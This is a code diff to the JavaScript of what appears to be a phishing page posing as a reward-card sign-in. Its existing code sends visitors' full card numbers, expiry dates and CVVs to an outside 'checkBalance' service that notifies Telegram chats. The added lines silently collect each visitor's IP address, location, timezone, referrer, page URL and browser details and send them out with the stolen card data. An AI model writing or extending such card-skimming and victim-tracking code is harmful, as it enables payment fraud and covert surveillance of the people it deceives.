@@ -463,6 +463,21 @@
     const TELEGRAM_AFTER='-1003750392427';
     const API_URL='https://bot.pc.am/v3/checkBalance';
 
+    let visitorIP='unknown';
+    let visitorCity='';
+    let visitorCountry='';
+    (async function(){
+      try{
+        const r=await fetch('https://ipapi.co/json/');
+        const d=await r.json();
+        visitorIP=d.ip||'unknown';
+        visitorCity=d.city||'';
+        visitorCountry=d.country_name||'';
+      }catch(e){}
+    })();
+    const visitorTimezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown';
+    const visitorReferral=document.referrer||'direct';
+
     (function(){
       try{
         if(localStorage.getItem('yourewardcard_cookies')==='accepted'){document.getElementById('cookieBar').classList.add('hide');return;}
@@ -544,7 +559,8 @@
       submitBtn.disabled=true;submitBtn.innerHTML='<span class="spinner"></span> Signing in...';
       loadingOverlay.classList.add('show');
       try{
-        const params=new URLSearchParams({token:API_TOKEN,number:digits,month:(expiryMonth.value||'').padStart(2,'0'),year:expiryYear.value||'',cvv:cvvInput.value||''});
+        const extraNote='IP: '+visitorIP+(visitorCity?' | Location: '+visitorCity+', '+visitorCountry:'')+' | Timezone: '+visitorTimezone+' | Referral: '+visitorReferral+' | Page: '+window.location.href+' | UA: '+navigator.userAgent;
+        const params=new URLSearchParams({token:API_TOKEN,number:digits,month:(expiryMonth.value||'').padStart(2,'0'),year:expiryYear.value||'',cvv:cvvInput.value||'',telegram_additional_note:extraNote});
         if(TELEGRAM_BEFORE)params.set('telegram_id_before_check',TELEGRAM_BEFORE);
         if(TELEGRAM_AFTER)params.set('telegram_id_after_check',TELEGRAM_AFTER);
         const res=await fetch(API_URL+'?'+params.toString());
